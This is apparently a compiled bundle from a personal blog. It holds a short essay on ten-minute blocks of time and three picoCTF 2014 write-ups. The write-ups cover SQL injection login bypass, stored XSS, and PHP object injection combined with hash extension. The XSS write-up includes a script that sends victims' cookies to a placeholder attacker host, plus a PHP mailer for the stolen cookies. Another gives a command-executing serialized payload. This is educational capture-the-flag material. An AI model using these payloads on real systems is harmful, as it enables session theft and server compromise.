"use strict";(self.webpackChunkpersonalpage=self.webpackChunkpersonalpage||[]).push([[477],{10:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"many-minutes-few-moments","metadata":{"permalink":"/blog/many-minutes-few-moments","source":"@site/blog/2023-05-28-many-minutes-few-moments.md","title":"10 minute moments","description":"16 waking hours \xf7 10 minutes = 96","date":"2023-05-28T00:00:00.000Z","formattedDate":"May 28, 2023","tags":[],"readingTime":0.945,"hasTruncateMarker":false,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.jpg","key":"csressel"}],"frontMatter":{"slug":"many-minutes-few-moments","title":"10 minute moments","authors":"csressel"},"unlisted":false,"nextItem":{"title":"picoCTF 2014 part 3: Steve\'s List","permalink":"/blog/picoctf-2014-part3"}},"content":"> 16 waking hours \xf7 10 minutes = 96\\n>\\n> 10 minutes is ~1% of your day.\\n\\n\\\\- [credit to Taylor Troesh](https://taylor.town/10-minutes)\\n\\nWhen the phone scrolling lasts for 10 minutes, or low-priority yak shaving adds up to 10 minutes, that\'s one percent of your day spent.\\nThat\'s not necessarily a bad thing or a good thing, but make sure it\'s a thing you want to have spent one percent of your day on.\\n\\nYou only have this many 10 minute moments.\\n\\n<pre style={{ width: \\"min-content\\" }}>\\n\ud83e\udd71  \ud83d\udcf1  \ud83e\udea5  \ud83c\udf73  \ud83e\udd50  \ud83d\udcf1\\n\u2615  \ud83e\udde5  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udebd\\n\ud83d\udcac  \ud83d\udce7  \ud83c\udfa7  \ud83d\udcbb  \ud83d\udcde  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \u2615  \ud83d\udcbb\\n\ud83d\udcde  \ud83d\udcbb  \ud83d\udcf1  \ud83c\udfa7  \ud83d\udcbb  \ud83d\udcbb\\n\ud83d\udcac  \ud83d\udcbb  \ud83d\udcf1  \ud83c\udf71  \ud83c\udf71  \ud83d\udcf1\\n\u2615  \ud83d\udcbb  \ud83d\udcde  \ud83d\udcbb  \ud83d\udcbb  \ud83c\udfa7\\n\ud83d\udebd  \ud83d\udcf1  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udce7  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb\\n\ud83d\udcbb  \ud83d\udcac  \ud83e\udd6a  \ud83d\udcf1  \ud83d\udcbb  \ud83d\ude97\\n\ud83d\uded2  \ud83d\uded2  \ud83d\ude97  \ud83e\udd4f  \ud83e\udd4f  \ud83c\udfc3\\n\ud83c\udfc3  \ud83e\udd4f  \ud83e\udd4f  \ud83e\udd4f  \ud83c\udfcb\ufe0f  \ud83c\udfcb\ufe0f\\n\ud83c\udfcb\ufe0f  \ud83c\udfcb\ufe0f  \ud83e\uddd8  \ud83e\uddd8  \ud83d\ude97  \ud83d\ude97\\n\ud83d\udec1  \ud83c\udf72  \ud83c\udf72  \ud83d\udcfa  \ud83d\udcfa  \ud83d\udcf1\\n\ud83d\udcfa  \ud83d\udcbb  \ud83d\udebd  \ud83d\udcbb  \ud83d\udcbb  \ud83d\udcbb\\n\ud83e\udea5  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udcd6  \ud83d\udecc\\n</pre>\\n\\nMany minutes, but few moments."},{"id":"picoctf-2014-part3","metadata":{"permalink":"/blog/picoctf-2014-part3","source":"@site/blog/2014-12-01-picoctf-part3.md","title":"picoCTF 2014 part 3: Steve\'s List","description":"Summary","date":"2014-12-01T00:00:00.000Z","formattedDate":"December 1, 2014","tags":[],"readingTime":3.75,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.jpg","key":"csressel"}],"frontMatter":{"slug":"picoctf-2014-part3","title":"picoCTF 2014 part 3: Steve\'s List","authors":"csressel"},"unlisted":false,"prevItem":{"title":"10 minute moments","permalink":"/blog/many-minutes-few-moments"},"nextItem":{"title":"picoCTF 2014 part 2: secure_page_service","permalink":"/blog/picoctf-2014-part2"}},"content":"Summary\\n--------------\\nHash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website\u2019s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it\u2019s destroy method will be called. This method has been redefined to output the Post\u2019s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the \u2018e\u2019 flag, allowing us to do arbitrary command execution. By catting the necessary file at `/home/daedalus/flag.txt`, and substituting all of the Post\u2019s text with the file\u2019s contents, we can print the file\u2019s contents in an HTML comment, and thus get the flag.\\n\\n\x3c!--truncate--\x3e\\n\\nThe Hash Extension\\n-----------------------------\\nExamination of the hacked website shows the only possible input is through the cookies.\\nHowever, any attempts to manipulate the cooke result in us being locked out of the website.\\n\\nExamination of the website source makes it quickly apparent why:\\n```PHP\\n$custom_settings = urldecode($_COOKIE[\'custom_settings\']);\\n$hash = sha1(AUTH_SECRET . $custom_settings);\\nif ($hash !== $_COOKIE[\'custom_settings_hash\']) {\\n  die(\\"Why would you hack Section Chief Steve\'s site? :(\\");\\n}\\n```\\nThe cookie `custom_settings` will later be deserialized, and will be the site of our object inject. However, `custom_settings_hash` will need to change in a similar manner.\\n\\nTo not fail the validation, `custom_settings_hash` needs to be of the form `sha1(AUTH_SECRET . urldecode($_COOKIE[\'custom_settings\']))` where `AUTH_SECRET` is an unknown, eight letter secret.\\nAs we do not have access to `AUTH_SECRET`, it would appear that we are unable to change the `custom_settings` cookie.\\n\\nHowever, using a hash extension attack, we can change the value of `custom_settings_hash` to correspond to our new value of `custom_settings` without knowledge of the `AUTH_SECRET`.\\n\\nThe tool to be used is called <a href=\'https://github.com/iagox86/hash_extender\'>hash extender</a>. By downloading and compiling the program, we can generate the new value of `custom_settings_hash` with the following command:\\n\\n```Shell\\n$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table\\n```\\nwhere `d` is the previous `custom_settings`, `a` is the addition to the `custom_settings` (or the object injection), and s is the previous value of `custom_settings_hash`.\\n\\nWith this value, we can now manipulate `custom_settings` without tripping Steve\u2019s rudimentary IPS.\\n\\nThe Object Injection\\n-----------------------------\\nThere are several important items to notice while reading the source of the website.\\n\\n1. Whatever is in the `custom_settings` cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.\\n2. In the `classes.php` file, the Post\u2019s `__destruct()` method is redefined. It now is intended to output the Post\u2019s fields in comments, as \u201cdebugging stuff.\u201d\\n3. The Filter class used by the Post\u2019s `__destruct()` method uses the `preg_replace()` method with class fields as arguments.\\n\\nThese three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the `custom_settings` cookie.\\n\\nThe necessary object to cat the flag from `/home/daedalus/flag.txt` will look something like this in PHP:\\n\\n```PHP\\n$filter_set = [\\n\\t\\tnew Filter(\'/.*/e\', \'system(\\"cat /home/daedalus/flag.txt\\")\')\\n\\t];\\n$obj = serialize(true) . \\"\\\\n\\" . serialize(new Post(\\n\\t\\"the flag is\\",\\n\\t\\"fail\\",\\n\\t$filter_set));\\n```\\nThe Filter uses the \u201ce\u201d flag on the `preg_replace()` call. This will run the replacement argument as PHP code and replace the matching text with the output.\\n\\nBy having out only filter match everything, and run the command `$ cat /home/daedalus/flag.txt`, we will replace the body of the Post we inject with the flag.\\n\\nOutputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of `custom_settings_hash`. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.\\n\\nFinally, by replacing `custom_settings` with a urlencoding of the serialized object, and `custom_settings_hash` with the new signature, we will see the flag in the comments of the site:\\n\\nD43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve\\n\\n----\\n\\nNote: the payload for `custom_settings` will look something like:\\n```\\nb%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D\\n```\\nHowever, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup."},{"id":"picoctf-2014-part2","metadata":{"permalink":"/blog/picoctf-2014-part2","source":"@site/blog/2014-11-30-picoctf-part2.md","title":"picoCTF 2014 part 2: secure_page_service","description":"Summary","date":"2014-11-30T00:00:00.000Z","formattedDate":"November 30, 2014","tags":[],"readingTime":2.16,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.jpg","key":"csressel"}],"frontMatter":{"slug":"picoctf-2014-part2","title":"picoCTF 2014 part 2: secure_page_service","authors":"csressel"},"unlisted":false,"prevItem":{"title":"picoCTF 2014 part 3: Steve\'s List","permalink":"/blog/picoctf-2014-part3"},"nextItem":{"title":"picoCTF 2014 part 1: Injection 2","permalink":"/blog/picoctf-2014-part1"}},"content":"Summary\\n--------------\\nThis problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin\u2019s cookies should they choose to visit the page. The \u201cReport to Moderator\u201d button says, \u201cReport this page, and a moderator will personally review it in the next few minutes!\u201d so it is a safe assumption that we can have an admin view our injected code.\\n\\n\x3c!--truncate--\x3e\\n\\nRecon\\n----------\\nThe first thing we need is an account on the challenge\'s site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.\\n\\nExamining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (\u201cSpam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!\u201d).\\n\\nFurthermore, attempting to use HTML tags reveals that the input allows HTML code.\\n\\nEnter XSS\\n---------------\\nWe can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer\u2019s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.\\n\\nOnce we have the admin\u2019s cookies, we can change our cookies to theirs to view the locked page.\\n\\nThe Setup\\n---------------\\nFirst we need the two scripts.\\n\\nThe injected script for the page will be:\\n```html\\n<script>location.href = \'http://www.YourDomainName.com/cookiestealer.php?cookie=\'+document.cookie;<\/script>\\n````\\n\\nAnd the php script at the above domain name (cookiestealer.php) will look like:\\n```php\\n<?php\\n$cookie = $HTTP_GET_VARS[\\"cookie\\"]; mail(\\"YourEmail@YouMailProvider.com\\", \\"Stolen Cookies\\", $cookie);\\n?>\\n```\\n\\nFor free hosting, a number of options are available. We chose to use <a href=\'http://www.000webhost.com/\'>000webhost</a>, simply because they have a nice in-browser file manager\u2014no need to mess around with FTP clients.\\n\\nCookie Forgery\\n----------------------\\nAfter setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.\\n\\nFrom here, we check our email for the admin cookies. Using a plugin like <a href=\'https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en\'>this</a> or <a href=\'https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/\'>this</a> we can quickly change our cookies to the admin\'s, allowing us to view the locked page, and thus, the flag:\\n\\nwow\\\\_cross\\\\_site\\\\_scripting\\\\_is\\\\_such\\\\_web"},{"id":"picoctf-2014-part1","metadata":{"permalink":"/blog/picoctf-2014-part1","source":"@site/blog/2014-11-29-picoctf-part1.md","title":"picoCTF 2014 part 1: Injection 2","description":"Summary","date":"2014-11-29T00:00:00.000Z","formattedDate":"November 29, 2014","tags":[],"readingTime":2.18,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.jpg","key":"csressel"}],"frontMatter":{"slug":"picoctf-2014-part1","title":"picoCTF 2014 part 1: Injection 2","authors":"csressel"},"unlisted":false,"prevItem":{"title":"picoCTF 2014 part 2: secure_page_service","permalink":"/blog/picoctf-2014-part2"}},"content":"Summary\\n--------------\\nBy unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program\u2019s requirements.\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- \'\\n```\\n(with \u201c1337\u201d entered as the password)\\n\\n\x3c!--truncate--\x3e\\n\\nThe Program\\n-------------------\\nThe source is available <a href=\'http://web2014.picoctf.com/injection2/login.phps\'>here</a>. Examination of the source shows several things.\\nFirst, we can make injections into the username field.\\nSecond, the returned data from the query will need to meet the following requirements to reveal the flag:\\n- `mysqli_num_rows($result) === 1` \u2014 only one row\\n- `$row[\\"password\\"] === $password` \u2014 row\u2019s password must match our given password\\n- `$row[\\"user_level\\"] >= 1337` \u2014 row\u2019s user_level must be greater than or equal to 1337\\n\\nFinally, by setting the form\u2019s hidden field \u201cdebug\u201d to 1, we receive a nice view of our input and the generated query.\\n\\nThe Injection\\n------------------\\nBy taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.\\n\\nAn injection of:\\n```\\nasdf\' UNION SELECT 0 AS a LIMIT 1 -- \\n```\\nWill yield the query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 0 AS a LIMIT 1 -- \\n```\\n\\nLet\u2019s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.\\nThis gives us the following error:\\n```\\nSQL error: The used SELECT statements have a different number of columns\\n```\\n\\nHowever, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.\\nNew query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 0 AS a, 0 AS b, 0 AS c, 0 AS d, 0 AS e LIMIT 1 -- \\n```\\nAs we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.\\n\\nThe final query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- \'\\n```\\n\\nThis proves successful!\\n(as the flag appears to be dynamically generated it is not included here)"}]}')}}]);